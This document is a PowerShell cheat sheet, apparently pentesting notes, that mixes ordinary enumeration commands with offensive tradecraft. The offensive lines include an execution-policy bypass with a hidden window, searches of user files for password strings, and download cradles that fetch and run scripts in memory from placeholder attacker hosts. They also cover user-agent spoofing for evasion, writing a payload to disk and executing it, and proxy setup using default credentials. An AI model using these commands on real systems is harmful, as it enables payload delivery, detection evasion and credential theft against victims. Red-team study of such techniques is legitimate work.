# ExecutionPolicy Bypass and Hidden Window
`powershell.exe -ExecutionPolicy bypass -Window hidden .\downloader.ps1`

# Cmdlets
`Get-ChildItem | Format-List *` | Get all named properties associated with the object (in this case Get-ChildItem)

# Get Process
`Get-Process | Sort-Object -Unique | Select-Object ProcessName`

# Get Process, Sort Unique, Save to file
`Get-Process | Sort-Object -Unique | Select-Object ProcessName > uniq_procs.txt` 

# Get Aliases for Get-ChildItem
`Get-Alias -Definition Get-ChildItem`

# Get WMI Objects using select
`Get-WmiObject -class win32_operatingsystem | select -Property *`
# OR
`Get-WmiObject -class win32_operatingsystem | fl *`
# OR
`Get-WmiObject -class win32_operatingsystem | Format-List *`

# Sort Unique Paths for Windows Services
`Get-WmiObject -class win32_service | Sort-Object -Unique PathName | fl Pathname`

# Export as CSV
`Get-WmiObject -class win32_operatingsystem | fl * | Export-Csv C:\Users\ryane\Documents\host_info.csv`

# Access Windows Registry Hives
`cd HKLM:\`

# Select String | looking for regex pass* in any text documents at specified path
`Select-String -Path C:\Users\ryane\Documents\*.txt -Pattern pass*`
# OR
`ls -r C:\Users\ryane\Documents -File *.txt | % {sls -Path $_ -Pattern pass* }`

# Get Content
`Get-Content C:\Users\ryane\Documents\file.txt`

# Get Service
`Get-Service`

# Get Services starting with S in descending order
`Get-Service "s*" | Sort-Object Status -Descending`

#####################################
# Modules
#####################################

# Currently Imported Modules
`Get-Module`

# List All Available Modules
`Get-Module -ListAvailable`

# Import Module
`Import-Module .\module.psm1`

# PowerSploit Download 
`https://github.com/PowerShellMafia/PowerSploit/archive/master.zip`

#####################################
# Objects
#####################################

# Get List of Methods for Object
`Get-Process | Get-Member -MemberType Method`

# Get Process and Kill
`Get-Process -Name "firefox" | Kill`

# Create Object To Download file to a target system
`$webclient = New-Object System.Net.WebClient`
`$payload_url = "https://attacker_host/payload.exe"`
`$file = "C:\ProgramData\payload.exe"`
`$webclient.DownloadFile($payload_url,$file)`

#####################################
# Download Cradle
#####################################

# From PS
`iex (New-Object Net.Webclient).DownloadString("http://attacker_url/script.ps1")`
# OR CMD Prompt
`powershell.exe iex (New-Object Net.Webclient).DownloadString('http://attacker_url/script.ps1')`
# OR

# Memory Download 
`$downloader = New-Object System.Net.WebClient`
`$downloader.Headers.Add("user-agent", "Mozilla/5.0 (WIndows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")` | Optional for evasion if abnormal header detected
`$payload = "http://attacker_url/script.ps1"`
`$command = $downloader.DownloadString($payload)`
`Invoke-Expression $command`

# Optional Memory Download && Execution
`$req = [System.Net.WebRequest]::Create("http://attacker_URL/script.ps1")`
`$res = $req.GetResponse()`
`iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()`

# Disk Download (Noisy and more likely to be detected)
`$downloader = New-Object System.Net.WebClient`
`$payload = "http://attacker_url/script.ps1"`
`$local_file = "C:\Users\ryane\Documents\payload.exe`
`$downloader.DownloadFile($payload,$local_file)`

# Executing file once on target system
`& $local_file` | & is the call operator

# !!!USE THIS FOR PROXY!!!
`$proxy = [Net.WebRequest]::GetSystemWebProxy()`
`$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials`
`$downloader.Proxy = $proxy`

